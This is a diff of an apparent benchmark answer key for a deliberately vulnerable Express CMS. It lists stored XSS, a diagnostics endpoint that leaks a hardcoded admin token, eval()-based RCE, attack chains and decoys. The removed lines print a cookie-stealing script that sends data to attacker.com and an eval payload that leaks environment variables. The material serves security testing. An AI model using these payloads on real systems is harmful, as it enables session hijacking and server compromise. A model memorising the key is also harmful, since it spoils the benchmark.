@@ -1,86 +1,111 @@
-# Audit Report: app-19 — Content Management System
+# Security Report: app-19 — Content Management System
 
-**Language:** JavaScript (Express)  
-**Business Domain:** Content Publishing  
-**Date:** 2026-05-24
+**Language:** Javascript (Express)
+**Directory:** `apps/javascript/app-19-cms`
+
+---
+
+## Application Information
+- **App ID:** app-19
+- **Name:** Content Management System
+- **Language:** Javascript
+- **Framework:** Express
+
+## Vulnerability Summary
+
+The following vulnerability list represents the ground truth security issues identified for this application:
+
+| ID | OWASP | Category | Severity | Location | CWE |
+|---|---|---|---|---|---|
+| V1 | A03 | Injection | High | src/index.js | CWE-79 |
+| V2 | A05 | Security Misconfiguration | Medium | src/index.js | CWE-209 |
+| V3 | A08 | Software and Data Integrity Failures | High | src/index.js | CWE-502 |
 
 ---
 
 ## Standalone Vulnerabilities
 
-### VULN-01: A03 — Injection (Stored XSS)
+### VULN-01: A03 — Injection
 
-**Severity:** High  
-**Location:** `src/index.js:155-166` — `GET /api/posts/:id/comments`  
-**Lines:**
-```javascript
-// VULNERABILITY A03: Stored XSS in comment retrieval
-```
+- **Severity:** High
+- **Location:** `src/index.js`:136-146 (method: `GET /api/posts/:id/comments`)
+- **CWE:** [CWE-79](https://cwe.mitre.org/data/definitions/79.html)
 
-**Difficulty: EASY**
+#### Description
+Stored user comments are rendered directly to the client without escaping HTML entities, exposing readers to Stored XSS.
 
-- Comments returned as raw JSON without HTML escaping
-- Attacker can post a comment containing `<script>` payload
-- Any reader viewing comments will execute the stored script
+### VULN-02: A05 — Security Misconfiguration
 
-### VULN-02: A05 — Security Misconfiguration (Diagnostics Leak)
+- **Severity:** Medium
+- **Location:** `src/index.js`:229-245 (method: `GET /api/system/diagnostics`)
+- **CWE:** [CWE-209](https://cwe.mitre.org/data/definitions/209.html)
 
-**Severity:** Medium  
-**Location:** `src/index.js:258-275` — `GET /api/system/diagnostics`  
-**Lines:**
-```javascript
-// VULNERABILITY A05: Security Misconfiguration - Diagnostics Endpoint
-```
+#### Description
+An open diagnostics route discloses node configurations and a hardcoded administrative recovery API token when query parameters activate debug mode.
 
-**Difficulty: EASY**
+### VULN-03: A08 — Software and Data Integrity Failures
 
-- Open diagnostics endpoint with `?debug=true` reveals config details
-- Leaks hardcoded `editor_token: CMS-ADMIN-EDITOR-KEY-xyz9988`
-- Token can be used as `x-editor-token` header to authenticate as admin
+- **Severity:** High
+- **Location:** `src/index.js`:165-195 (method: `POST /api/posts`)
+- **CWE:** [CWE-502](https://cwe.mitre.org/data/definitions/502.html)
 
-### VULN-03: A08 — Software and Data Integrity Failures (RCE via eval)
+#### Description
+Layout configurations submitted by users are parsed using the insecure eval() constructor, enabling remote code execution on the server host.
 
-**Severity:** High  
-**Location:** `src/index.js:188-215` — `POST /api/posts`  
-**Lines:**
-```javascript
-// VULNERABILITY A08: Software and Data Integrity Failures - Insecure Deserialization
-```
-
-**Difficulty: MEDIUM**
-
-- `layout_metadata` parsed via `eval()` — arbitrary code execution
-- Requires authentication (AUTHOR role)
-- Payload `{constructor.constructor('return process')().env}` leaks environment
 
 ---
 
-## Chained Attack: chain-01
+## Chained Attack Scenarios
 
-**Chain Name:** Diagnostics Token Leak → XSS Admin Session Hijack  
-**Combined Impact:** Account Takeover  
-**Overall Chain Difficulty: MEDIUM**
+Chained scenarios represent multiple code-level weaknesses that, when exploited in sequence, lead to high-impact outcomes.
 
-### Link 1: Diagnostics Endpoint Leaks Admin Token (A05 — Medium)
+### CHAIN-01: Diagnostics Configuration Disclosure → Admin session hijacking via Stored XSS
 
-**Difficulty: EASY**
+- **Combined Impact:** `account_takeover`
+- **Difficulty:** Hard
+- **Subtlety Tags:** `cross_file` `stateful_flow` `implicit_trust` `realistic_decoy`
 
-- `GET /api/system/diagnostics?debug=true` returns `editor_token: CMS-ADMIN-EDITOR-KEY-xyz9988`
-- No authentication required
-- Token can be used via `x-editor-token` header to impersonate admin
+#### Prerequisites
+- attacker has or can create a low privilege account
+- attacker can combine request input with stored application state
 
-### Link 2: Stored XSS via Comments (A03 — Medium)
+#### Attack Narrative
+An attacker invokes `/api/system/diagnostics?debug=true` to obtain the editor token `CMS-ADMIN-EDITOR-KEY-xyz9988`. Utilizing this token to bypass authentication, they POST a comment containing an XSS cookie stealer payload to `/api/posts/1/comments`. When the admin visits the post page, their session cookie is leaked to the attacker.
 
-**Difficulty: EASY**
+#### Chain Components
+| Step | Description | Severity | OWASP | CWE | Location | Method |
+|---|---|---|---|---|---|---|
+| 1 | System diagnostics endpoint leaks administrative API token key. | Medium | A05 | CWE-209 | src/index.js | `GET /api/system/diagnostics` |
+| 2 | Comment list rendering returns raw script content without sanitization. | Medium | A03 | CWE-79 | src/index.js | `GET /api/posts/:id/comments` |
 
-- Post a comment with `<script>document.location='http://attacker.com/?c='+document.cookie</script>`
-- When admin views the post, their session cookie is exfiltrated
-- Attacker hijacks admin session for full account takeover
+### CHAIN-02: Subtle Deserialization Pivot To Injection
+
+- **Combined Impact:** `account_takeover`
+- **Difficulty:** Hard
+- **Subtlety Tags:** `cross_file` `stateful_flow` `implicit_trust` `realistic_decoy` `secondary_chain`
+
+#### Prerequisites
+- attacker has or can create a low privilege account
+- attacker can combine request input with stored application state
+
+#### Attack Narrative
+Attacker combines a low-visibility entry point with stored or derived application state, then pivots to a higher-impact sink that is reachable only after following the cross-file flow.
+
+#### Chain Components
+| Step | Description | Severity | OWASP | CWE | Location | Method |
+|---|---|---|---|---|---|---|
+| 1 | Layout configurations submitted by users are parsed using the insecure eval() constructor, enabling remote code execution on the server host. | High | A08 | CWE-502 | src/index.js | `POST /api/posts` |
+| 2 | An open diagnostics route discloses node configurations and a hardcoded administrative recovery API token when query parameters activate debug mode. | Medium | A05 | CWE-209 | src/index.js | `GET /api/system/diagnostics` |
+| 3 | Stored user comments are rendered directly to the client without escaping HTML entities, exposing readers to Stored XSS. | High | A03 | CWE-79 | src/index.js | `GET /api/posts/:id/comments` |
+
 
 ---
 
-## Summary
+## Decoys (False-Positive Candidates)
 
-App-19 is a JavaScript Express CMS with stored XSS in comments, a diagnostics endpoint leaking an admin editor token, and `eval()`-based RCE in post creation. Chain: Diagnostics token leak → stored XSS comment → admin session hijack.
+These code patterns mimic security weaknesses but are safe. They are included to measure static analyzer precision:
 
-**Overall Difficulty Score:** 2/5 (Easy)
+| Location | Description |
+|---|---|
+| src/index.js | Proper escaping of HTML tags on page titles during lookup in GET /api/posts/:id. |
+| src/index.js | Safe JSON metadata parsing using standard JSON.parse in POST /api/posts/safe. |
